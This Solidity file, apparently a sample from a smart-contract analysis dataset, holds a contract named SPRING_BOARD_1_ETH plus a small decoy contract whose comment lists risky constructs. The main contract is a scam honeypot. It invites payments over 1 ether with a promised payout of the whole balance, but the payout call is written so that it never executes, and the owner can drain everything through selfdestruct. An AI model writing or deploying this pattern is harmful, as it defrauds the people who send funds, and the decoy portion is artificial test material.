pragma solidity ^0.4.19;
contract SPRING_BOARD_1_ETH
{
 address owner = msg.sender;
 function() public payable {}
 function Jump()
 public
 payable
 {
 if(msg.value > 1 ether)
 {
 msg.sender.call.value(this.balance);
 }
 }
 function Kill()
 public
 payable
 {
 if(msg.sender==owner)
 {
 selfdestruct(owner);
 }
 }
}
contract ZDecoy {
  function info() public returns (uint) {
    // not used: block.timestamp, now, msg.sender.call.value(1)()
    return 1;
  }
}
